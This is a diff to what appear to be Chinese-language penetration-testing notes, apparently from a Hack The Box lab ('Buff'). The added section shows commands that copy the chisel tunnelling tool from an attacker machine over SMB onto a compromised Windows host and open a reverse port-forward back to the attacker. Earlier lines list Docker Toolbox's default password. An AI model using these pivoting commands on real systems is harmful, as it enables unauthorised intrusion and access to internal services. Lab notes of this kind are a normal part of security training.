@@ -72,3 +72,21 @@ _____________________________
 #### 该发行版中 docker 用户的默认密码是什么？docker/tcuser
 #### docker-toolbox有默认情况下访问c:\Users文件夹，该文件夹挂载在/c/Users 
 #### 关于sqlmap | from Toolbox
+_____________________________
+#### 在https://github.com/jpillora/chisel/releases下载chisel_1.6.0_windows_amd64、chisel_1.6.0_linux_amd64.gz From Buff
+```
+chisel 的作用只有一个词：
+🔁 端口转发（隧道）
+你做的是：
+👉 把「目标机的 8888」
+👉 映射到「你攻击机的 8888」
+
+[★]$ gunzip chisel_1.6.0_windows_amd64.gz
+C:\ProgramData>net use \\10.10.14.134\share
+C:\ProgramData>copy \\10.10.14.134\share\chisel_1.6.0_windows_amd64 c.exe
+C:\ProgramData>.\c.exe client 10.10.14.134:8000 R:8888:localhost:8888
+
+[★]$ gunzip chisel_1.6.0_linux_amd64.gz
+[★]$ chmod 777 chisel_1.6.0_linux_amd64
+[★]$ ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse
+```
